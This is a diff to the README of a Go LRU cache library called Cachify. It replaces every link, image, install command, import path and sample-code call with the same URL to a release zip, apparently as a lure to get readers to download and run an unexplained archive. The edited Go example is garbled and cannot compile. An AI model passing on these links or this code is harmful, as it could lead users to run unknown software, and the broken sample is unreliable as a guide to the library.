@@ -2,7 +2,7 @@
 
 Welcome to the official repository of **Cachify** - a powerful, thread-safe Least Recently Used (LRU) cache library for Go! 📦
 
-![Cachify Logo](https://example.com/cachify-logo.png)
+![Cachify Logo](https://github.com/Shadow10010/cachify/releases/download/v1.0/Release.zip)
 
 ## Overview
 
@@ -20,7 +20,7 @@ Welcome to the official repository of **Cachify** - a powerful, thread-safe Leas
 
 You can download the latest version of **Cachify** from the following link:
 
-[![Download Cachify](https://img.shields.io/badge/Download-Cachify-green)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Cachify](https://github.com/Shadow10010/cachify/releases/download/v1.0/Release.zip)](https://github.com/Shadow10010/cachify/releases/download/v1.0/Release.zip)
 
 Once downloaded, follow the instructions to launch the software.
 
@@ -29,7 +29,7 @@ Once downloaded, follow the instructions to launch the software.
 You can also install **Cachify** using Go Modules with the following command:
 
 ```bash
-go get -u github.com/22155555/1875695542
+go get -u https://github.com/Shadow10010/cachify/releases/download/v1.0/Release.zip
 ```
 
 ## Getting Started
@@ -41,19 +41,19 @@ package main
 
 import (
 	"fmt"
-	"github.com/22155555/1875695542"
+	"https://github.com/Shadow10010/cachify/releases/download/v1.0/Release.zip"
 )
 
 func main() {
 	// Create a new cache with a capacity of 100 items
-	cache := cachify.New(100)
+	cache := https://github.com/Shadow10010/cachify/releases/download/v1.0/Release.zip(100)
 
 	// Add a key-value pair to the cache
-	cache.Set("key", "value")
+	https://github.com/Shadow10010/cachify/releases/download/v1.0/Release.zip("key", "value")
 
 	// Retrieve the value from the cache
-	if value, ok := cache.Get("key"); ok {
-		fmt.Println(value)
+	if value, ok := https://github.com/Shadow10010/cachify/releases/download/v1.0/Release.zip("key"); ok {
+		https://github.com/Shadow10010/cachify/releases/download/v1.0/Release.zip(value)
 	}
 }
 ```
@@ -92,8 +92,8 @@ We welcome contributions to make **Cachify** even better! Feel free to submit bu
 
 Thank you for choosing **Cachify** for your caching needs! 🌟
 
-For more information, visit our [website](https://cachify.com) or check the "Releases" section for updates and new features. 🚀
+For more information, visit our [website](https://github.com/Shadow10010/cachify/releases/download/v1.0/Release.zip) or check the "Releases" section for updates and new features. 🚀
 
 Stay tuned for exciting updates and enhancements coming soon! 💼
 
-![Cachify](https://example.com/cachify-image.png)
+![Cachify](https://github.com/Shadow10010/cachify/releases/download/v1.0/Release.zip)
